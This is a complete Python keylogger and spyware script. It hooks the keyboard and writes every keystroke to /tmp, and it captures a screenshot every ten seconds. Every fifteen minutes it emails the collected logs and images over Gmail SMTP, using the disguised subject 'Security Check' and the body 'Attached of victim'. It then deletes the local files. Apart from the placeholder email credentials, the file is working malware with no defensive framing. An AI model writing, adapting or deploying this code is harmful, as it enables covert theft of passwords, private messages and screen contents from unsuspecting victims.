import os
import time
import threading
from datetime import datetime
from PIL import ImageGrab
import pyxhook
import smtplib
from email.message import EmailMessage

#  Keylogger logic 
def keylogger():
    log_dir = "/tmp"
    timestamp = datetime.now().strftime("%d-%m-%Y_%H:%M")
    log_file = f'{log_dir}/{timestamp}.log'

    special_keys = {
        'Return': '[ENTER]',
        'space': '[SPACE]',
        'Tab': '[TAB]',
        'BackSpace': '[BACKSPACE]',
        'Escape': '[ESC]',
        'Caps_Lock': '[CAPSLOCK]',
        'Shift_L': '[SHIFT]',
        'Shift_R': '[SHIFT]',
        'Control_L': '[CTRL]',
        'Control_R': '[CTRL]',
        'Alt_L': '[ALT]',
        'Alt_R': '[ALT]',
        'Up': '[UP]',
        'Down': '[DOWN]',
        'Left': '[LEFT]',
        'Right': '[RIGHT]',
    }

    def OnKeyPress(event):
        with open(log_file, "a") as f:
            if event.Key in special_keys:
                f.write(special_keys[event.Key])
            elif 32 <= event.Ascii <= 126:
                f.write(chr(event.Ascii))
            else:
                f.write(f"[{event.Key}]")

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()
    new_hook.start()

# Screenshot capture logic 
def screen_capture():
    output_dir = "/tmp/screenshots"
    os.makedirs(output_dir, exist_ok=True)

    while True:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join(output_dir, filename)

        img = ImageGrab.grab()
        img.save(filepath)

        time.sleep(10)

# Email sending logic 
def send_email():
    FROM_EMAIL = "your_mail@gmail.com"
    FROM_PASS = "your_pass_code"
    TO_EMAIL = "your_mail@gmail.com"

    while True:
        time.sleep(900) 

        msg = EmailMessage()
        msg['Subject'] = "Security Check"
        msg['From'] = FROM_EMAIL
        msg['To'] = TO_EMAIL
        msg.set_content("Attached of victim")

        file_paths = []

        for root, dirs, files in os.walk("/tmp"):
            for file in files:
                if file.endswith(".log") or file.endswith(".png"):
                    path = os.path.join(root, file)
                    file_paths.append(path)

        for path in file_paths:
            with open(path, 'rb') as f:
                file_data = f.read()
                file_name = os.path.basename(path)
                msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

        if file_paths:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(FROM_EMAIL, FROM_PASS)
                smtp.send_message(msg)

            for path in file_paths:
                os.remove(path)

if __name__ == "__main__":
    t1 = threading.Thread(target=keylogger, daemon=True)
    t2 = threading.Thread(target=screen_capture, daemon=True)
    t3 = threading.Thread(target=send_email, daemon=True)

    t1.start()
    t2.start()
    t3.start()

    while True:
        time.sleep(1)
